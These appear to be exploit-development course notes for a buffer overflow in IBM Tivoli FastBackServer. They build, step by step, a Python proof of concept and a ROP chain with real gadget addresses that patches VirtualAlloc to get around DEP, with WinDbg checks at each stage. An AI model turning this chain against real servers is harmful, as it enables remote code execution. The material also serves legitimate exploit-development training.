Check for memory protections:
	!vprot eip
	
Above shows page_execute_read which means it is executable and readable, run this on esp:
	!vprot esp
	
We see page_readwrite which means it is only writable and readable

Checking for DEP with narly which it checks the PE header for
	.load narly
	!nmod
	
Now we will use a dummy nop values in the stack 
	ed esp 90909090
	r eip = esp
	r
	p
	
And we can see an access violation 

Return Oriented Programming
The first gadget in the figure above pops a value from the stack into ECX. The return instruction makes it execute the next gadget, which in turn pops a value from the stack into EAX.

Executing the next return instruction will bring us to the third gadget. This gadget will write the contents of EAX to the memory address stored in ECX. This concept allows us to write arbitrary content to an arbitrary memory address.

The stack layout to accomplish this is illustrated in Figure 6.

Because of the variable length of assembly instructions on the x86 architecture, returning into the middle of existing opcodes can lead to different instructions, as shown in Listing 7.


Gadget Selection

Using rp++ 
Once the execution completes, we can open the output file and inspect the syntax of the located gadgets.


	copy "C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe" .
	
	rp-win-x86.exe -f FastBackServer.exe -r 5 > rop.txt
	
Poc code we will use:
	import socket
	import sys
	from struct import pack
	
	# psAgentCommand
	buf = bytearray([0x41]*0xC)
	buf += pack("<i", 0x534)  # opcode
	buf += pack("<i", 0x0)    # 1st memcpy: offset
	buf += pack("<i", 0x500)  # 1st memcpy: size field
	buf += pack("<i", 0x0)    # 2nd memcpy: offset
	buf += pack("<i", 0x100)  # 2nd memcpy: size field
	buf += pack("<i", 0x0)    # 3rd memcpy: offset
	buf += pack("<i", 0x100)  # 3rd memcpy: size field
	buf += bytearray([0x41]*0x8)
	
	# psCommandBuffer
	formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (b"A"*0x200,0,0,0,0)
	buf += formatString
	
	# Checksum
	buf = pack(">i", len(buf)-4) + buf
	
	def main():
	        if len(sys.argv) != 2:
	                print("Usage: %s <ip_address>\n" % (sys.argv[0]))
	                sys.exit(1)
	        
	        server = sys.argv[1]
	        port = 11460
	
	        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	        s.connect((server, port))
	
	        s.send(buf)
	        s.close()
	
	        print("[+] Packet sent")
	        sys.exit(0)
	
	
	if __name__ == "__main__":
	 	main()

Getting the offset
	msf-pattern_create -l 0x200

Update script with this:
	import socket
	import sys
	from struct import pack
	
	# psAgentCommand
	buf = bytearray([0x41]*0xC)
	buf += pack("<i", 0x534)  # opcode
	buf += pack("<i", 0x0)    # 1st memcpy: offset
	buf += pack("<i", 0x500)  # 1st memcpy: size field
	buf += pack("<i", 0x0)    # 2nd memcpy: offset
	buf += pack("<i", 0x100)  # 2nd memcpy: size field
	buf += pack("<i", 0x0)    # 3rd memcpy: offset
	buf += pack("<i", 0x100)  # 3rd memcpy: size field
	buf += bytearray([0x41]*0x8)
	
	# psCommandBuffer
	pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac...
	
	formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (pattern,0,0,0,0)
	buf += formatString
	
	# Checksum
	buf = pack(">i", len(buf)-4) + buf
	...
	
Next, we execute the updated proof of concept and observe the access violation and grab the EIP and use msf to determine the offset
	msf-pattern_offset -q 41326a41

Update the script further:
	import socket
	import sys
	from struct import pack
	
	# psAgentCommand
	buf = bytearray([0x41]*0xC)
	buf += pack("<i", 0x534)  # opcode
	buf += pack("<i", 0x0)    # 1st memcpy: offset
	buf += pack("<i", 0x500)  # 1st memcpy: size field
	buf += pack("<i", 0x0)    # 2nd memcpy: offset
	buf += pack("<i", 0x100)  # 2nd memcpy: size field
	buf += pack("<i", 0x0)    # 3rd memcpy: offset
	buf += pack("<i", 0x100)  # 3rd memcpy: size field
	buf += bytearray([0x41]*0x8)
	
	# psCommandBuffer
	offset = b"A" * 276
	eip = b"B" * 4
	rop = b"C" * (0x400 - 276 - 4)
	
	formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+eip+rop,0,0,0,0)
	buf += formatString
	
	# Checksum
	buf = pack(">i", len(buf)-4) + buf
	...

Also check for bad characters and note them
	 badchars = (
	    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
	    b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
	    b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
	    b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
	    b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
	    b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
	    b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
	    b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
	    b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
	    b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
	    b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
	    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
	    b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
	    b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
	    b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
	    b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
	    b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
	    b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
	    b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
	
LOCATING GADGETS
Now dump the start and end of the address of the executable:
	lm m FastBackServer
	


 we find the uppermost byte is always 0x00.

Since the sscanf API accepts a null-terminated string as the first argument, and that is the buffer that ends up overflowing the stack buffer, our ROP chain cannot contain any NULL bytes or other bad characters. This implies that the gadgets cannot come from FastBackServer.exe.

You can search for modules using just lm

We are going to use CSFTPAV6.dll, which does not start with a null byte
	lm m CSFTPAV6

Let's copy CSFTPAV6.dll to the C:\Tools\dep folder where we can use rp++ to generate gadgets
	copy "C:\Program Files\Tivoli\TSM\FastBack\server\csftpav6.dll" .
	rp-win-x86.exe -f csftpav6.dll -r 5 > rop.txt

Prepare the script:

We are going to invoke VirtualAlloc by placing a skeleton of the function call on the stack through the buffer overflow, modifying its address and parameters through ROP, and then return into it. The skeleton should contain the VirtualAlloc address followed by the return address (which should be our shellcode) and the arguments for the function call.

Updating the script with dummy values for the virtualalloc address:
	import socket
	import sys
	from struct import pack
	
	# psAgentCommand
	buf = bytearray([0x41]*0xC)
	buf += pack("<i", 0x534)  # opcode
	buf += pack("<i", 0x0)    # 1st memcpy: offset
	buf += pack("<i", 0x500)  # 1st memcpy: size field
	buf += pack("<i", 0x0)    # 2nd memcpy: offset
	buf += pack("<i", 0x100)  # 2nd memcpy: size field
	buf += pack("<i", 0x0)    # 3rd memcpy: offset
	buf += pack("<i", 0x100)  # 3rd memcpy: size field
	buf += bytearray([0x41]*0x8)
	
	# psCommandBuffer
	va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
	va += pack("<L", (0x46464646)) # Shellcode Return Address
	va += pack("<L", (0x47474747)) # # dummy Shellcode Address
	va += pack("<L", (0x48484848)) # dummy dwSize 
	va += pack("<L", (0x49494949)) # # dummy flAllocationType 
	va += pack("<L", (0x51515151)) # dummy flProtect 
	
	offset = b"A" * (276 - len(va))
	eip = b"B" * 4
	rop = b"C" * (0x400 - 276 - 4)
	
	formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+va+eip+rop,0,0,0,0)
	buf += formatString
	
	# Checksum
	buf = pack(">i", len(buf)-4) + buf
	...
	
Once the proof of concept is executed, the network packet will trigger the buffer overflow and position the dummy values exactly before the 0x42424242 DWORD that overwrites EIP. We can verify this by restarting FastBackServer and attaching WinDbg.
	dd esp - 1C


Making ROP's Acquaintance

The easiest way of obtaining a stack address close to the dummy values is to use the value in ESP at the time of the access violation. We cannot modify the ESP register, since it must always point to the next gadget for ROP to function. Instead, we will copy it into a different register.

We'll have to be creative to get a copy of the ESP register. A gadget like "MOV EAX, ESP ; RET" would be ideal, but they typically do not exist as natural opcodes. In this case, we do some searching and find the following gadget.
	0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret
	
First, it will push the content of ESP to the top of the stack. Next, the content of EAX is pushed to the top of the stack, thus moving the value pushed from ESP four bytes farther down the stack.

Next, the POP EDI instruction will pop the value from EAX into EDI and increase the stack pointer by four, effectively making it point to the value originally contained in ESP. Finally, the POP ESI will pop the value from ESP into ESI, performing the copy of the address we need.

...
# psCommandBuffer
va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
va += pack("<L", (0x46464646)) # Shellcode Return Address
va += pack("<L", (0x47474747)) # dummy Shellcode Address
va += pack("<L", (0x48484848)) # dummy dwSize 
va += pack("<L", (0x49494949)) # dummy flAllocationType 
va += pack("<L", (0x51515151)) # dummy flProtect 

offset = b"A" * (276 - len(va))
eip = pack("<L", (0x50501110)) # push esp ; push eax ; pop edi; pop esi ; ret
rop = b"C" * (0x400 - 276 - 4)

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+va+eip+rop,0,0,0,0)
buf += formatString

# Checksum
buf = pack(">i", len(buf)-4) + buf
...

Now put a breakpoint at the address of the gadget:
	bp 0x50501110
	g

Notice the current value in esp and step through the next steps
	p
Dump esp to validate what's happening
	dd esp L1
And repeat:
	p
	dd esp L1
Step through again and watch what happens to the esp
	p
	dd esp L1
Now do it one more time and we can see that esi now contains the same value as esp
	p
	dd esp L1
This also shows that we are at our 43 values in from our buffer

Obtaining VirtualAlloc address
We can get the IAT to find the virtualalloc value, in ida running against the dll can help us identify VirtualAlloc
Open ida, point to the dll, search for VirtualAlloc in the imports tab:


The address for this api will change on reboot, but IAT does not so let's use the IAT address and dereference it to find VirtalAlloc

We need to locate the address on the dummy dword value, resolve the address of virtaulalloc and then write that value on top of the placeholder value

Revert the poc to having eip filled with just B's, and run


The dummy value 0x45454545, which represents the location of the VirtualAlloc address, is at a negative offset of 0x1C from ESP.
Ideally, since we have a copy of the ESP value in ESI, we would like to locate a gadget similar to the following.
	SUB ESI, 0x1C
	RETN
	
The problem with this approach is that the 0x1C value is really 0x0000001C, which has NULL bytes in it.

We can get around the problem by adding -0x1C rather than subtracting 0x1C. The reason this works is because the CPU represents -0x1C as a very large value
	? -0x1c

To obtain a copy of ESI in EAX, we can use the gadget "MOV EAX,ESI ; POP ESI; RETN", which does a move operation. Additionally, we can update the rop variable in the proof of concept
	rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
	rop += pack("<L", (0x42424242)) # junk
	rop += b"C" * (0x400 - 276 - 4 - len(rop))
	
Notice that the gadget contains a POP ESI instruction. This requires us to add a dummy DWORD on the stack for alignment.

To observe the execution of the new gadget, we restart FastBackServer, set a breakpoint on the gadget that copies ESP into ESI, and send the packet:
	bp 0x50501110
	g
	pt
	p
	p
	p
	dd esp L1


The second instruction pops the dummy value (0x42424242) into ESI, and when we reach the RET instruction, we are ready to execute the next ROP gadget.

At this point, EAX contains the original address from ESP. Next, we have to pop the -0x1C value into ECX and add it to EAX.

We can use a "POP ECX" instruction to get the negative value into ECX, followed by a gadget containing an "ADD EAX, ECX" instruction. This will allow us to add -0x1C to EAX
	rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
	rop += pack("<L", (0x42424242)) # junk
	rop += pack("<L", (0x505115a3)) # pop ecx ; ret
	rop += pack("<L", (0xffffffe4)) # -0x1C
	rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
	rop += b"C" * (0x400 - 276 - 4 - len(rop))

The three lines added in the listing above should accomplish this. Before we execute, we set a breakpoint on address 0x505115a3, directly on the POP ECX gadget.
	bp 0x505115a3
	g
	p
	p
	p
	dd eax L1


With the correct value in EAX, we need to move that value back to ESI so we can use it in the next stages. We can do this with a gadget containing "PUSH EAX" and "POP ESI" instructions
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))

Once again, we can relaunch FastBackServer and WinDbg and set a breakpoint on the new gadget at 0x50537d5b.
	bp 0x50537d5b
	g
	p
	p
	dd esi L1
	


We previously found that the IAT address for VirtualAlloc is 0x5054A220, but we know 0x20 is a bad character for our exploit. To solve this, we can increase its address by one and then use a couple of gadgets to decrease it to the original value.

First, we use a POP EAX instruction to fetch the modified IAT address into EAX. Then we'll pop -0x00000001 (or its equivalent, 0xFFFFFFFF) into ECX through a POP ECX instruction. Next, we can reuse the ADD EAX, ECX instruction from the previous gadget to restore the IAT address value.

Finally, we can use a dereference to move the address of VirtualAlloc into EAX through a MOV EAX, DWORD [EAX] instruction. We can see observe gadgets added to the updated ROP chain
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffff)) # -1 into ecx
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))

Once again, we restart FastBackServer and WinDbg. This time, we set a breakpoint on 0x5053a0f5 to skip directly to the gadget containing the POP EAX instruction.
	bp 0x5053a0f5
	g
	p
	p
	p
	p
	p
	p
	p
	u eax L1
	


The last step is to overwrite the placeholder value on the stack at the address we have stored in ESI.

We can use an instruction like MOV DWORD [ESI], EAX to write the address in EAX onto the address pointed to by ESI. Our updated ROP chain

rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffff)) # -1 into ecx
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))

restart FastBackServer and WinDbg and set a breakpoint on the address of our newly added gadget. Now we can send the packet:
	bp 0x5051cbb6
	g
	p
	dds esi L1
	



Patching the return address


In this section, we must solve a problem very similar to patching the address of VirtualAlloc. First, we must align ESI with the placeholder value for the return address on the stack. Then we need to dynamically locate the address of the shellcode and use it to patch the placeholder value.

At the end of the last section, ESI contained the address on the stack where VirtualAlloc was written. This means that ESI is only four bytes lower than the stack address we need. An instruction like ADD ESI, 0x4 would be ideal, but it does not exist in our selected module.

A common instruction we might find in a gadget is the incremental (INC) instruction. These instructions increase the value in a register by one.

In our case, we can find an INC ESI instruction in multiple gadgets. None of the gadgets are clean, but it's possible to find one without any bad side effects
	rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
	...
	rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
	rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
	rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
	rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
	rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
	rop += b"C" * (0x400 - 276 - 4 - len(rop))

Notice that we use the increment instruction four times to have ESI increased by four bytes. The side effect will only modify EAX, which we do not have to worry about at this point.

After setting our breakpoint at this new gadget and executing the updated ROP chain, we find that the increment gadgets are executed:
	bp 0x50522fa7
	g
	dd esi L2
	p
	p
	p
	dd esi L1


In Listing 57, we skipped from the first INC ESI to the last. Here we find that ESI is now pointing to the address of the placeholder value for the return address, which was initially set as 0x46464646.

With ESI aligned correctly, we need to get the shellcode address in EAX so that we can reuse the "MOV DWORD [ESI], EAX ; RET" gadget to patch the placeholder value.

We will solve this problem by using the value in ESI and adding a fixed value to it. Once we finish building the ROP chain, we can update the fixed value to correctly align with the beginning of the shellcode.

First, we need to copy ESI into EAX. We need to do this in such a way that we keep the existing value in ESI, since we need it there to patch the placeholder value. An instruction like "MOV EAX, ESI" is optimal, but unfortunately, the only gadgets containing this instruction also pop a value into ESI. We can however solve this by restoring the value in ESI with the previously-used "PUSH EAX ; POP ESI ; RET" gadget.

Since we need to add a small positive offset to EAX, we have to deal with null bytes again. We can solve this once more by using a negative value.

Here we can simply use an arbitrary value, such as 0x210 bytes, represented as the negative value 0xfffffdf0. (The reason we use 0x210 instead of 0x200 is to avoid null bytes.)

We pop this negative value into ECX and use a gadget containing a SUB EAX, ECX instruction to set up EAX correctly. The required gadgets are given in Listing 58 as part of the updated ROP chain.
	rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
	...
	rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
	rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
	rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
	rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
	rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
	rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
	rop += pack("<L", (0x42424242)) # junk
	rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
	rop += pack("<L", (0x505115a3)) # pop ecx ; ret
	rop += pack("<L", (0xfffffdf0)) # -0x210
	rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
	rop += b"C" * (0x400 - 276 - 4 - len(rop))

we will let the breakpoint trigger twice before we start single-stepping.
	bp 0x5050118e
	g
	g
	p
	p
	p
	p
	p
	p
	p
	ecx=fffffdf0
	p
	p
	dd eax L4
	
we successfully copied the value from ESI to EAX, while also restoring the original value in ESI. In addition, we subtracted a large negative value from EAX to add a small positive number to it. Once we know the exact offset from ESI to the shellcode, we can update the 0xfffffdf0 value to the correct one.

At this point, EAX contains a placeholder address for our shellcode, which we can update once we finish building the entire ROP chain.

The last step of this section is to overwrite the fake shellcode address (0x46464646) value on the stack. Once again, we can do this using a gadget containing a "MOV DWORD [ESI], EAX" instruction.
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf0)) # -0x210
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))

This time, we can repeat the action of setting a breakpoint on the last gadget and continue execution until we trigger it the second time
	bp 0x5051cbb6
	g
	g
	p
	dd poi(esi) L4

Patching Arguments

At the end of the last section, ESI contained the address on the stack where the return address (shellcode address) was written. This means that ESI is only four bytes lower than lpAddress, and we can realign the register by reusing the same INC ESI instructions as we used before.

Additionally, since lpAddress needs to point to our shellcode, we can reuse the same gadgets as before and only subtract a different negative value from EAX.

In the previous example, we used the somewhat arbitrary value of -0x210 to align EAX to our shellcode. Since we increased ESI by 4, we need to use -0x20C or 0xfffffdf4 this time, as shown in the updated ROP chain below.

rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf4)) # -0x20c
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))

The new part of the ROP chain also reuses the write gadget to overwrite the placeholder value in the API skeleton call.
To verify our ROP chain, we execute it. We set a breakpoint on the last gadget like we did in the last section, only this time we must continue execution until it is triggered the third time:
	bp 0x5051cbb6
	g
	g
	g
	dd eax L4


Now we are going to move to dwSize, which we can set to 0x01, since VirtualAlloc will apply the new protections on the entire memory page. The issue is that the value is really a DWORD (0x00000001), so it will contain null bytes.

Once again, we must use a trick to avoid them, and in this case, we can take advantage of another math operation, negation. The NEG1 instruction will replace the value in a register with its two's complement.2

This is equivalent to subtracting the value from zero. When we do that with 0xffffffff (after ignoring the upper DWORD of the resulting QWORD), we get 0x01 
	? 0 - ffffffff


The steps we must perform for dwSize are:
	• Increase the ESI register by four with the increment gadgets to align it with the next placeholder argument in the API skeleton call.
	• Pop the value 0xffffffff into EAX and then negate it.
	• Write EAX onto the stack to patch the dwSize argument.

rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0xffffffff)) # -1 value that is negated
rop += pack("<L", (0x50527840)) # neg eax ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))


When we execute the update ROP chain, we can set a breakpoint on the gadget containing the POP EAX instruction. We have already used it once before, so we need to continue to the second time the breakpoint is triggered:
	bp 0x5053a0f5
	g
	g
	p
	p
	p
	p
	p
	dd esi - c L4


The negation trick works and we end up with 0x01 in EAX, which is then written to the stack.

Now we must move to flAllocationType, which must be set to 0x1000. We could try to reuse the trick of negation but we notice that two's complement to 0x1000 is 0xfffff000, which also contains null bytes:

Let's choose a large, arbitrary value like 0x80808080 that does not contain null-bytes. if we subtract this value from 0x1000, we get the value 0x7F7F8F80 which is also null free.
	? 1000 - 80808080
	? 80808080 + 7f7f8f80


Now we need to update our ROP chain to pop 0x80808080 into EAX, pop 0x7f7f8f80 into ECX, and then add them together.

rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0x80808080)) # first value to be added
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0x7f7f8f80)) # second value to be added
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))

Notice that we began by increasing ESI by four as usual to align to the next API argument, and we also reused the same write gadget at the end of the chain to update the flAllocationType value on the stack.

To view this in action, we set a breakpoint on the "ADD EAX, ECX" ROP gadget at address 0x5051579a. Since this gadget is used multiple times, we can create a conditional breakpoint to avoid breaking at it each time.

We know that EAX must contain the value 0x80808080 when EAX and ECX are added together. We'll use the .if statement in our breakpoint in order to break on the target address only when EAX is set to 0x80808080. Due to sign extension, we must perform a bitwise AND operation to obtain the correct result in the comparison.
	bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}"
	g
	p
	p
	
We find that the ADD operation created the correct value in EAX (0x1000), which was then used to patch the placeholder argument on the stack.

The last argument is the new memory protection value, which, in essence, is what allows us to bypass DEP. We want the enum PAGE_EXECUTE_READWRITE, which has the numerical value 0x40.

In order to write that to the stack, we will reuse the same technique we did for flAllocationType.
	? 40 - 80808080
	? 80808080 + 7f7f7fc0
	
According to the additions, we can use the values 0x80808080 and 0x7f7f7fc0 to obtain the desired value of 0x40

rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0x80808080)) # first value to be added
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0x7f7f7fc0)) # second value to be added
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x5051e4db)) # int3 ; push eax ; call esi
rop += b"C" * (0x400 - 276 - 4 - len(rop))

After the last gadget, which writes the flProtect argument to the stack, we add an additional gadget. This gadget's first instruction is a software breakpoint and will not be part of the final exploit. This will allow us to execute the entire ROP chain and catch the execution flow just after the flProtect dummy value has been patched.
	g
	dds esi - 14 L6


Executing VirtualAlloc

When the ROP chain is finished patching the arguments for VirtualAlloc, ESI will contain the stack address of the last argument (flProtect). To obtain the stack address where VirtualAlloc was patched, we can move the contents of ESI into EAX and subtract a small value from it.

Any small value will contain null bytes, so instead we can leverage the fact that when 32-bit registers overflow, any bits higher than 32 will be discarded. Instead of subtracting a small value that contains null bytes, we can add a large value. This will allow us to align EAX with the VirtualAlloc address on the stack.

Once EAX contains the correct address, we move its content into EBP through an XCHG EAX, EBP; RET gadget. Finally, we can move the contents of EBP into ESP with the gadget we initially found.

The gadget that moves EBP into ESP has a side effect of popping a value into EBP. We must compensate for this and configure the stack so that a dummy DWORD just before the VirtualAlloc address is popped into EBP.

rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe8)) # negative offset value
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051571f)) # xchg eax, ebp ; ret
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))

Through trial and error, we find that we want to subtract 0x18 bytes from EAX to obtain the correct stack pointer alignment, which means we must add 0xffffffe8 bytes.

The first gadget in the newly added part of the ROP chain is used four times. To break directly on the fourth occurrence, we can leverage the fact that this part of the ROP chain comes just after patching flProtect on the stack.

This means EAX contains the value 0x40 to indicate readable, writable, and executable memory. We can use this to set a conditional breakpoint at 0x5050118e and only trigger it if EAX contains the value 0x40.
	bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"
	g
	p
	p
	p
	p
	p
	p
	dds eax L2
	


By looking at the above listing, we find that our trick of subtracting a large negative value from EAX resulted in EAX containing the stack address four bytes prior to VirtualAlloc.

